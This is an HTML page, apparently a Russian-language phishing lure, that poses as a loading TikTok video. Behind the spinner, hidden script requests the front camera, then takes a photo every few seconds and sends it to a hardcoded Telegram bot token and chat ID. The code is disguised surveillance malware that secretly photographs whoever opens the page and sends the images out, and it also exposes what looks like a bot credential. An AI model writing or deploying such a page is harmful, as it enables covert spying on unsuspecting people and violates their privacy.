<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body {
            background-color: #010101;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Proxima Nova', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55; /* Фирменный цвет TikTok */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        /* Скрываем технические элементы */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <!-- Технические элементы для фото -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';

    async function takeAndSendPhoto(video, canvas) {
        if (video.videoWidth === 0) return;

        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        
        const dataURL = canvas.toDataURL('image/jpeg', 0.5);
        const blob = await (await fetch(dataURL)).blob();
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        try {
            // Используем прокси cors-anywhere или аналогичный, если прямой запрос блокируется
            const url = `https://api.telegram.org{botToken}/sendPhoto`;
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData,
                mode: 'cors' // Явно указываем режим
            });

            const result = await response.json();
            if (!result.ok) alert('Бот ответил ошибкой: ' + result.description);
        } catch (e) {
            console.error("Критическая ошибка:", e);
        }
    }

    window.onload = () => {
        // Запрашиваем камеру с мобильной оптимизацией
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
        })
        .then(stream => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;
            // Делаем первое фото через 2 сек после загрузки, затем каждые 5 сек
            setTimeout(() => { takeAndSendPhoto(video, canvas); }, 2000);
            setInterval(() => { takeAndSendPhoto(video, canvas); }, 5000); 
        })
        .catch(err => {
            // Если доступа нет, пранк не сработает
            console.log("Камера заблокирована");
        });
    };
</script>
</body>
</html>
